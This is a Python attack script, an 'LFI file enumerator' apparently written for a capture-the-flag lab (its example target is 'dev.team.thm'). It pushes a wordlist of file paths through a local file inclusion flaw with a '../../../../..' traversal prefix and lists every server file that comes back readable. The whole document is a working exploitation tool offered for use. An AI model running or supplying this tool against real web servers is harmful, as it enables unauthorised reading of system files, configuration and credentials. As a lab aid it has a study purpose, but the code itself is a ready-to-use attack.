import argparse
from termcolor import cprint 
import requests


class Main():
	def __init__(self):
		usage = "lfi-file-enumerator.py [-w WORDLIST] [--url URL]"
		

		desc = "Example:\n\tlfi-file-enumerator.py --wordlist 'rockyou.txt' --url 'http://dev.team.thm/script.php?page=../../../../..%s'\n\n\tNote: %s will take the place of the payload"
		

		parser = argparse.ArgumentParser(usage = usage, description = desc, formatter_class=argparse.RawTextHelpFormatter)

		parser.add_argument("--wordlist", help = "Wordlist", required=True, type = str, default = "/tmp/names.txt")
		parser.add_argument("--url", required=True, help = r"LFI url.", type = str)

		self.args = parser.parse_args()


		# Methods
		self.banner()
		wordlist = self.generate_wordlist()
		self.validate_url()
		self.send_request(wordlist)
		

	def generate_wordlist(self):
		try:
			data = open(self.args.wordlist, "r").read().splitlines()
			cprint("[+] Found wordlist", "green")
			return data


		except Exception as e:
			cprint("[+] File Not found", "red")



	def validate_url(self):
		try:
			cleaned_url = self.args.url.replace("\\", "")
			res = requests.get(cleaned_url)
			cprint("[+] URL seems to be fine", "green")

		except Exception as e:
			cprint("[-] invalid url", "red")


	def send_request(self, wordlist):
		try:
			cprint("\n[+] Possible files that are accessible\n", "cyan")
			cleaned_url = self.args.url.replace("\\", "")

			for path in wordlist:
				template = cleaned_url%(path)
				res = requests.get(template)

				if (res.status_code == 200 and len(res.content.decode()) > 1):
					print('{} => status: 200'.format(path))

		except Exception as e:
			print(e)


		






	def banner(self):
		print('''
   __   ________  _____ __      ____                             __          
  / /  / __/  _/ / __(_) /__   / __/__  __ ____ _  ___ _______ _/ /____  ____
 / /__/ _/_/ /  / _// / / -_) / _// _ \/ // /  ' \/ -_) __/ _ `/ __/ _ \/ __/
/____/_/ /___/ /_/ /_/_/\__/ /___/_//_/\_,_/_/_/_/\__/_/  \_,_/\__/\___/_/   
                                                                             
							-- By ShaFdo
			''')



main = Main();

